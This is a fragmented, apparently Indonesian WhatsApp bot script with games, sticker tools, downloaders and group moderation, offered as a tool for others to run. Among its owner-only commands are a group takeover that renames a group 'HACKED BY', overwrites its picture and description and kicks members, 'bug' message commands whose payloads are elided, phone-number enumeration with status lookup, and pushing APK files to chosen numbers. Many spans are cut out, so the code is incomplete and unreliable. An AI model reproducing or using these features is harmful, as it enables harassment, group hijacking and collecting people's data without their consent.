...
› Create By zallmods Dazai
› Base Ori zallmods Dazai - zallmods Dazai

🌷 KALAU MAU RENAME TARO CREDITS GUA : zallmods Dazai*/
...
//=================================================//
module.exports = zallmods = async (zallmods, m, chatUpdate, store) => {
 try {
...
const botNumber = await zallmods.decodeJid(zallmods.user.id)
...
const groupMetadata = m.isGroup ? await zallmods.groupMetadata(from).catch(e => {}) : ''
...
// AntiLink
if (AntiLink) {
linkgce = await zallmods.groupInviteCode(from)
...
kice = m.sender
await zallmods.groupParticipantsUpdate(from, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
zallmods.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
...
userJid: zallmods.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zallmods.user.id)
...
zallmods.ev.emit('messages.upsert', msg)
}
...
//=================================================//
const sendapk = (teks) => {
zallmods.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yoapk zallmods Dazai')
}
...
//=================================================//
const sendzip = (teks) => {
zallmods.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yozip zallmods Dazai')
}
...
const senddocu = (teks) => {
zallmods.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yopdf zallmods Dazai')
}
...
const sendvn = (teks) => {
zallmods.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
...
.on('finish', async () => {
await zallmods.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
.on('finish', async () => {
await zallmods.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "```Success```", gifPlayback: false }, { quoted: m })
...
try {
ppuser = await zallmods.profilePictureUrl(m.sender, 'image')
} catch (err) {
...
zallmods.sendImageAsSticker(from, ano, m, { packname: global.packname, author: global.author })
}
//=================================================//
try {
...
${Array.from(room.jawaban, (jawaban, index) => {
    ...
    ${isSurender ? '' : `Perfect Player`}`.trim()
            zallmods.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
        ...
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
        ...
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
        ...
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
	    ...
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
        ...
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
        ...
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
	...
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await zallmods.sendButtonText(from, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, zallmods.user.name, m)
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    ...
	    if (room.x !== room.o) await zallmods.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await zallmods.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    ...
	    zallmods.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    ...
	    zallmods.sendText(from, `Suit telah dikirimkan ke chat
...
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) zallmods.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) zallmods.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) zallmods.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    zallmods.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    ...
	    if (!roof.pilih2) zallmods.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) zallmods.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    ...
	    zallmods.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot zallmods Dazai${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
...
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot zallmods Dazai${text ? ': ' + text : ''}`)
}
break
case 'nsfw': {
if (!isCreator) return m.reply(mess.owner)
...
const anuala = {
video:fs.readFileSync("./baseikal/video/zallmods.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
...
zallmods.sendMessage(from, anuala, `zallmods Dazai${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
caption: `© zallmods Dazai${buttonkal}`,
} 
zallmods.sendMessage(from, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
...
zallmods.sendMessage(from, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
...
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await zallmods.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
sticSukses(from)
//await sleep(5000)
}
break
...
let encmedia = await zallmods.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await zallmods.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
...
let encmedia = await zallmods.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
...
reply(mess.wait)
mee = await zallmods.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
zallmods.sendImageAsSticker(from, kaytid, m, { packname: global.packname, author: global.author })
break
//==============================================*===//
...
let media = await zallmods.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
zallmods.sendMessage(from, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
 ...
 if (!isCreator) return m.reply(mess.owner)
              ...
              if (qtod === "true") {
try {
pporg = await zallmods.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://telegra.ph/file/b6d27c4ce762c9abeec69.jpg'
}
                await zallmods.updateProfilePicture(from, { url: pporg }).catch((err) => fs.unlinkSync(pporg))
                }
                await zallmods.groupUpdateSubject(from, `HACKED BY zallmods Dazai.WA`).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
                await zallmods.groupUpdateDescription(from, `HACKED BY zallmods Dazai.WA`).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
await zallmods.groupParticipantsUpdate(from, [m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                m.reply(`Gooo!!!`)
...
await zallmods.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
...
zallmods.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
...
zallmods.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
...
let media = await zallmods.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await zallmods.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
...
zallmods.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
...
zallmods.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
zallmods.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
...
zallmods.sendMessage(from, ko, { quoted:m })
}
break
case 'getname': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
namenye = await zallmods.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
zallmods.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
...
zallmods.sendMessage(from, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await zallmods.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
zallmods.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
...
zallmods.sendTextWithMentions(from, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`*Contoh* :\n#penjara zallmods Dazai [ Lu Sambil Replay Si nmr Target `)
let cret = await zallmods.groupCreate(args.join(" "), [])
let response = await zallmods.groupInviteCode(cret.id)
zallmods.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」
...
⭔ Url : ${anu.url}`,
footer: zallmods.user.name,
buttons: buttons,
headerType: 4
}
zallmods.sendMessage(from, buttonMessage, { quoted: m })
}
break
case "ytmp4":{
if (!isCreator) return m.reply(mess.owner)
...
*zallmods Dazai*`
m.reply(`${result4}`)
zallmods.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'warning': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
zallmods.sendMessage(from, { text : `Harap segera melakukan topup saldo untuk renew/perpanjang server di panel amgeekz.site, 1-3 hari apabila server tidak di perpanjang akan langsung di hapus oleh admin` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
...
zallmods.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
...
`${q}`,])
.then((data) => zallmods.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
...
let wokwol = await zallmods.serializeM(await m.getQuotedObj())
...
if (!isCreator) return m.reply(mess.owner)
 ...
 for (let i of anu) {
 let metadata = await zallmods.groupMetadata(i)
...
zallmods.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
...
zallmods.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'sendlinkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281378169657`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await zallmods.groupInviteCode(from)
zallmods.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sticSukses(from)
}
break
...
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await zallmods.groupInviteCode(from)
zallmods.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
...
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
zallmods.groupRevokeInvite(from)
break
//=================================================//
case 'tagall': {
if (!isCreator) return m.reply(mess.owner)
...
zallmods.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
zallmods.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
...
break
case '*': {
if (!text) throw `Contoh : ${prefix + command} zallmods Dazai`
let teks = `${q}`
{
zallmods.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text : `${teks}`},{ quoted:m })
}
}
break
//=================================================//
...
case 'sound160':
case 'sound161':
zallmodsgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await zallmods.sendMessage(from, { audio: zallmodsgans, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
//=================================================//
...
if (args[0] === 'close'){
    await zallmods.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await zallmods.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await zallmods.sendButtonText(from, buttons, `Mode Group`, zallmods.user.name, m)
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
     if (args[0] === 'open'){
await zallmods.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else if (args[0] === 'close'){
await zallmods.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else {
     let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await zallmods.sendButtonText(from, buttons, `Mode Edit Info`, zallmods.user.name, m)
...
await zallmods.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
    }
    break
//=================================================//
case 'setppbot': {
...
await zallmods.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zallmods.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text ?'
await zallmods.groupUpdateSubject(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
...
await zallmods.groupUpdateDescription(from, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
...
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await zallmods.downloadAndSaveMediaMessage(quoted)
zallmods.sendMessage(from, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await zallmods.downloadAndSaveMediaMessage(quoted)
zallmods.sendMessage(from, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
//=================================================//
...
zallmods.sendMessage(from, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zallmods.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
...
await zallmods.groupParticipantsUpdate(from, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zallmods.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
...
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zallmods.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
...
`.trim()
zallmods.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'antilink': {
...
let ceknye = await zallmods.onWhatsApp(bnnd + `@s.whatsapp.net`)
...
teksooo += `\n*Total : ${owner.length}*`
zallmods.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
//=================================================//
//=================================================//
case 'powner': case 'crator':{
zallmods.sendContact(from, global.owner, m)
}
break
case 'welcome': {
if (!isCreator) return m.reply(mess.owner)
...
zallmods.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
await zallmods.sendButtonText(from, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!
...
let buttons = [
{buttonId: `zxmenu`, buttonText: {displayText: 'LIST MENU'}, type: 1},
{buttonId: `zallmenu`, buttonText: {displayText: 'ALL MENU'}, type: 1},
{buttonId: `bandit`, buttonText: {displayText: 'CREDIT'}, type: 1}
]
const buttonMessage = {
...
╠〉Creator : Zall Mods
╠〉Running : Panel Only
╠〉Group Bot : http://bitly.ws/BLA6
╠〉Owner : http://bitly.ws/BLAc
╠〉Note : Owner Baik Gk Kaya Orng
╚════════════════`,
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, zallmods.user.name, `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, zallmods.user.name, `Silahkan Pilih Game Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'antilonk':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, zallmods.user.name, `Silahkan Pilih Antilink Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'welcomeee':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, zallmods.user.name, `Silahkan Pilih Welcome Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'angtitox':
if (!isCreator) return m.reply(mess.owner)
touchmebree = [
...
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻`, zallmods.user.name, `Silahkan Pilih Toxic Nya`, `Click Here 🌷`, touchmebree, m)
break
case 'downloadmenu': {
...
Sewa Bot ? Hubungi Admin Untuk Nego Wa.me/6281378169657`)
}
break
...
.then(({data}) => {
zallmods.sendImage(from, data.url, 'Success Coy', m)
})
break
case 'jadian': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
...
zallmods.sendMessage(from, buttonMessage, {mentions: menst})
}
break
...
if (Input) {
let cekno = await zallmods.onWhatsApp(Input)
...
//=================================================//
case 'hwcap': {
if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di zallmods Dazai :)')
...
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN zallmods Dazai SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
zallmods.relayMessage(from, document.message, { messageId: document.key.id })
...
"caption": "HELLO KAK SKRIP INI ASLI BUATAN zallmods Dazai SELAMAT MENCOBA 🥳",
}
}), { userJid: from })
zallmods.relayMessage(from, document.message, { messageId: document.key.id })
...
Admin3 = 6281378169657
`)
}
break
//=================================================//
case 'pdana': {
zallmods.sendMessage(from, { image: dana,  caption: `DANA : 085714170944` }, { quoted:m })
}
break
case 'pgopay': {
zallmods.sendMessage(from, { image: gopay,  caption: `GOPAY : 085714170944` }, { quoted:m })
}
break
case 'pbca': {
zallmods.sendMessage(from, { image: rekening,  caption: `Rek BCA : 2832657396` }, { quoted:m })
}
break
//=================================================//
...
case 'infoamgeekz': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
zallmods.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
...
case 'redemcode': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
zallmods.sendMessage(from, { text : `*CARA MASUKAN KODE REDDEM AMGEEKZ*
...
zallmods.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted:m })
break
//=================================================//
 case 'apakah':
 if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
...
zallmods.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
break
//=================================================//
case 'nowa': {
if (!isCreator) return m.reply(mess.owner)
...
var anu = await zallmods.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await zallmods.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
...
let delb = await zallmods.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
...
teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf zallmods Dazai + sambil reply pesan target* \n\n Contoh 2 : yopdf zallmods Dazai`
m.reply(teksoooo)
}
break
case 'yopdf':{
...
let teks = `${q}`
{
zallmods.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
...
let teks = `${q}`
{
zallmods.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
...
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
zallmods.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot zallmods Dazai
...
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
kicee = m.sender
await zallmods.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
zallmods.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
}
break
case 'addzip':{
if (!isCreator) return m.reply(mess.owner)
...
teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip zallmods Dazai + sambil reply pesan target* \n\n Contoh 2 : yozip zallmods Dazai`
m.reply(teksooooo)
}
break
case 'yozip':{
...
let teks = `${q}`
{
zallmods.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendzip': {
...
let teks = `${q}`
{
zallmods.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
...
teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk zallmods Dazai + sambil reply pesan target* \n\n Contoh 2 : yoapk zallmods Dazai`
m.reply(teksoooooo)
}
break
case 'yoapk':{
...
let teks = `${q}`
{
zallmods.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
}
}
break
case 'sendapk': {
...
let teks = `${q}`
{
zallmods.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted: m})
...
Lihat list Pesan Dengan ${prefix}listmsg`)
            ...
            case 'sendlist': {
                ...
                zallmods.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
...
case 'getmsg': {
                ...
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                zallmods.copyNForward(from, msgs[text.toLowerCase()], true)
            }
            break
...
zallmods.sendMessage(from, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
...
let ghd = await zallmods.sendMessage(from,{video:{url: res.url[0].url},caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"},{quoted:m})
}
break
...
let ghd = await zallmods.sendMessage(from,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!isCreator) return m.reply(mess.owner)
...
m.reply('Sabar Cuy Loading')
let res = await tiktok(q)
